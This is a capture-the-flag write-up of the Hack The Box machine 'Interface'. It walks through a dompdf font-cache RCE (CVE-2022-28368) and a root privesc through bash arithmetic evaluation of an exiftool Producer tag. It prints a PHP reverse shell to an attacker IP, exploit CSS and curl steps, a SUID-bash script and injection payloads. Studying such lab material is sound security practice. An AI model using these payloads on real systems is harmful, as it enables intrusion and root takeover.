---
layout: post
title: "HTB: Interface"
subtitle: "dompdf font-cache RCE via a hidden API subdomain, then an exiftool Producer tag into a bash arithmetic eval cron"
date: 2023-04-22
tags: [htb, linux, dompdf, cve-2022-28368, exiftool]
category: writeups
kind: machine
tldr: "A CSP header leaked an internal API subdomain hosting an html2pdf endpoint backed by dompdf. CVE-2022-28368 abuses dompdf's font caching to write a PHP file into the web-accessible fonts directory, which gave a shell as www-data. A root cron ran bash arithmetic over a PDF Producer tag, so injecting a command substitution with exiftool got code execution as root via a SUID bash."
---

## the box

Interface is a medium Linux box at `10.10.11.200`. Port `22` ran OpenSSH 7.6p1 (Ubuntu `4ubuntu0.7`, so 18.04 bionic) and port `80` ran nginx 1.14.0 in front of a Next.js site stuck on a maintenance page. The front page had nothing to click, so the way in came from response headers, not the page itself. Two ideas carry the box: attack surface leaks through headers, and bash arithmetic is an `eval` primitive when you feed it untrusted strings.

## recon

Standard two-stage scan:

```bash
nmap -p- --min-rate 10000 10.10.11.200
nmap -p 22,80 -sCV 10.10.11.200
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site Maintenance
```

The page itself was a static maintenance notice with `contact@interface.htb` and nothing else interactive. The embedded JSON and the `_next/static/` chunk paths confirmed Next.js / React behind nginx:

```json
{"props":{"pageProps":{}},"page":"/","buildId":"Z79wh4kSTt439cxBUytQN",
 "nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}
```

The real lead was in the response headers. The `Content-Security-Policy` referenced a host that was not linked anywhere on the page:

```
content-security-policy: ... connect-src 'self' http://prd.m.rendering-api.interface.htb ...
```

That is an internal API subdomain the front end talks to, exposed only because CSP whitelists the origin. I added it to `/etc/hosts`:

```
10.10.11.200 interface.htb prd.m.rendering-api.interface.htb
```

Content discovery on the API host showed it was a PHP app fronted by Composer. The `/vendor/` autoload files returned 200 with 0 bytes while the lockfiles were 403:

```
403 - /composer.json
403 - /composer.lock
200 - /vendor/autoload.php
200 - /vendor/composer/ClassLoader.php
403 - /vendor/composer/installed.json
```

The base API path responded with structured JSON, which made fuzzing easy because real routes and missing routes returned different bodies. `/api` returned `{"status":"404","route not defined"}`. POST-fuzzing under `/api/` and filtering the 50-byte "missing" responses found the endpoint:

```bash
ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
  -mc all -fs 50
```

That returned `html2pdf`. Hitting it with an empty body gave a 422 `{"status_text":"missing parameters"}`, so it wanted JSON. Setting `Content-Type: application/json` and posting `{"html": "test"}` rendered a PDF:

```bash
curl -s http://prd.m.rendering-api.interface.htb/api/html2pdf \
  -H 'Content-Type: application/json' -d '{"html": "test"}' -o out.pdf
```

The PDF metadata named the renderer: dompdf 1.2.0.

## foothold

dompdf 1.2.0 is vulnerable to **CVE-2022-28368**. When dompdf parses a CSS `@font-face` rule, it downloads the referenced font and writes it to a local font cache so it does not re-fetch next time. The cache filename is predictable, the cache directory is under the web root, and dompdf writes the cache file with a `.php` extension. So if you point `@font-face` at a "font" that is actually a file with embedded PHP, dompdf saves attacker-controlled PHP to a path you can then request and execute. I used the positive-security `dompdf-rce` repo, which packages the font file and CSS.

The cache path is built as:

```
/vendor/dompdf/dompdf/lib/fonts/[family]_[style]_[md5(font-url)].php
```

So I needed two things hosted on my box: a CSS file with the `@font-face` rule, and the malicious font file it points at. The CSS:

```css
@font-face {
    font-family: 'exploitfont';
    src: url('http://10.10.16.19:9001/exploit_font.php');
    font-weight: 'normal';
    font-style: 'normal';
}
```

The font file is a small valid TTF with a PHP one-liner appended in the metadata so dompdf accepts it as a font but the cached `.php` still executes. The payload I used was a straight reverse shell:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.19/1337 0>&1'");?>
```

I worked out the cache name by md5-ing the exact font URL:

```bash
echo -n "http://10.10.16.19:9001/exploit_font.php" | md5sum
```

That hash plus `family` and `style` gives the final filename, for example:

```
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_<md5>.php
```

The flow:

1. Host `exploit.css` and `exploit_font.php` on my HTTP server.
2. Submit HTML that pulls in the CSS through the `html` parameter, which makes dompdf fetch the font and cache it as PHP:

```bash
curl -s http://prd.m.rendering-api.interface.htb/api/html2pdf \
  -H 'Content-Type: application/json' \
  -d '{"html":"<html><head><link rel=stylesheet href=http://10.10.16.19:9001/exploit.css></head><body>x</body></html>"}' -o /dev/null
```

3. Request the cached PHP path, which runs my reverse shell:

```bash
curl -s http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_<md5>.php
```

With `nc -lvnp 1337` waiting, that caught a shell as `www-data`. After a `script`/`stty` upgrade I had a usable terminal.

## user

The dompdf shell ran as `www-data`, which already had read on `user.txt`, so the user flag came with the foothold.

## root

I ran linpeas to enumerate the host. It flagged a root-owned script and the cron that drives it. `pspy64` confirmed root executing it on a short interval:

```
UID=0 ... /bin/bash /usr/local/sbin/cleancache.sh
```

The script walks files in `/tmp`, reads each one's PDF `Producer` metadata tag with exiftool, and compares the tag against the string `dompdf` to decide whether to delete the file:

```bash
#!/bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do
    if [[ -f "$cfile" ]]; then
        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)
        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi
    fi
done
```

The bug is `[[ "$meta_producer" -eq "dompdf" ]]`. The `-eq` operator is an arithmetic comparison, so bash evaluates both operands as arithmetic expressions. Arithmetic context performs recursive parameter and command substitution, which means a `$(...)` inside an operand gets executed. This is exactly the "bash arithmetic is eval" behavior from [vidarholen's post](https://www.vidarholen.net/contents/blog/?p=716): `[[ $untrusted -eq N ]]` runs `$untrusted`. The `meta_producer` value comes straight from the file's Producer tag, which I control by writing a file into `/tmp` with a poisoned tag.

I reproduced the primitive locally first to be sure:

```bash
#!/bin/bash
read -rp "Enter guess: " num
if [[ "$num" -eq 42 ]]; then echo "Correct"; else echo "Wrong"; fi
```

Feeding `a[$(id>/tmp/out)]+42` to that script ran `id`, confirming the eval.

On the box, I staged a payload script that copies bash and SUIDs it, then poisoned a file's Producer tag with a command substitution that calls it:

```bash
mkdir /tmp/a; cd /tmp/a
cat > s << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/a/rr
chmod +s /tmp/a/rr
EOF
chmod +x s
```

I copied a real image into `/tmp` so the cron would scan it, then set its Producer tag to a command substitution. The arithmetic eval then runs `/tmp/a/s` as root when the file is compared:

```bash
cp /some/image.jpg /tmp/loot.jpg
/usr/bin/exiftool -Producer='a[$(/tmp/a/s >&2)]+42' /tmp/loot.jpg
```

The `a[...]` makes it look like an array subscript so the surrounding expression parses, and `+42` keeps the arithmetic syntactically valid. When root's cron processed the file, the subscript expression ran the substitution, which executed `/tmp/a/s` as root and dropped a SUID copy of bash at `/tmp/a/rr`. Running it with `-p` kept root:

```bash
/tmp/a/rr -p
id
# euid=0(root)
cat /root/root.txt
```

If spaces are a problem in the Producer value, `${IFS}` works as a separator, for example `a[$(cp${IFS}/bin/bash${IFS}/tmp/rr;chmod${IFS}4777${IFS}/tmp/rr)]+42`.

## takeaway

Two themes. First, attack surface leaks through headers: the CSP value exposed an internal service that was never meant to be reachable, and the rest of the box hung off that one host. Second, bash arithmetic is not a safe place to put untrusted strings. `[[ $untrusted -eq N ]]` is an eval, and feeding it attacker-controlled file metadata as root is the whole privesc.
